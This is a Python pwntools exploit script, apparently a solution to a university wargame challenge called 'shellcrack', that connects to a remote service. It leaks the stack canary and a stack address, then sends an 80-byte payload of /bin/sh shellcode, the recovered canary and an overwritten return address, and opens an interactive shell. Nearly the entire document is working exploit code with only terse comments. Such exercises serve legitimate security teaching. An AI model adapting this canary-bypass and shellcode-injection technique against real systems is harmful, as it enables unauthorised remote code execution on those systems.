#!/usr/bin/python2

from pwn import *
import time

PROGRAM_NAME = "shellcrack"
ENCODING = "ascii"
MAGIC_CHAR = 'Z'

# config local stuff
context.binary = './shellcrack'

def io_beg():
	return remote('plzpwn.me', 5001)
	#process("./shellcrack")
	#remote('plzpwn.me', 2000)
	
def io_rdy(x):
	x.recvuntil("Enter as", timeout = 3)
	x.recvline()
	return 1


# https://stackoverflow.com/a/3368991
def find_between( s, first, last ):
    try:
        start = s.index( first ) + len( first )
        end = s.index( last, start )
        return s[start:end]
    except ValueError:
        return ""

def find_between_r( s, first, last ):
    try:
        start = s.rindex( first ) + len( first )
        end = s.rindex( last, start )
        return s[start:end]
    except ValueError:
        return ""


def main():	
	# due to  madjick,
	# this script works (253/256) ^ 9 * 100 percent of times which is ok I hope

	# usage
	# 1. place in the same dir as shellcrack
	# 2. work

	context.binary = "./shellcrack"
	
	fin = 0
	stage = 0
	
	# https://github.com/Gallopsled/pwntools/issues/1048#issuecomment-335915889
	shell = pwnlib.shellcraft.sh()
	shell_asm = asm(shell)
	
	while(fin < 1):
		if(stage == 0):
			io = io_beg()						
			io_rdy(io)
			
			# interesting len1 values (dec)
			# * 16 (first leak)
			# * 63 (last non affecting canary)
			# * 64 (canary set to '' (NULL byte)
			len1 = 16
			print("len 1: "+str(len1))
			pay1 = MAGIC_CHAR*len1
			io.send(pay1)			
			print("pay 1 done")
			stage = stage + 1
		elif(stage == 1):
			# CANARY
			## skip
			io.recvuntil("This is the 6447 wargaming gateway,")
			
			## new leak
			canary1 = io.recvline().strip()
			
			## get leaked canary
			canary2 = find_between_r(canary1, MAGIC_CHAR, "!")
			print("*Gotten canary! Len: "+str(len(canary2))+" ["+canary2+"]")
		
			# LEAK (stack)
			leak1 = io.recvuntil("Write your data to the buffer", timeout=2)
			
			## [0xDEADFBEEF]
			leak2 = io.recvline()
			
			## 0xDEADFBEEF
			leak2 = find_between(leak2, "[", "]")
			print("*Gotten leak at "+leak2)
			
			# FINALISE
			canary = canary2 # BIN
			leak = leak2 # number in hex

			# 214756469 bla bla
			leak_int = int(leak, 16)

			stage = stage + 1
		elif(stage == 2):
			
			pay2 = pwnlib.util.packing.fit(pieces = {
					0: shell_asm,
					48: canary,
					72: p32(leak_int)
				}, filler='\x90', length = 80)
			io.sendline(pay2)			
			print("[FINAL] pay 2 done")
			stage = stage + 1
		elif(stage == 3):
			print("now lets just wait for magic to happen... epic'ly")
			print("==============="+"BEG"+"===============")
			print(io.recvall(timeout = 2))
			print("==============="+"FIN"+"===============")
			
			io.interactive()
			stage = stage + 1
		else:
			print("done. Awesome!")
			fin = 1

if __name__ == '__main__':
	main()
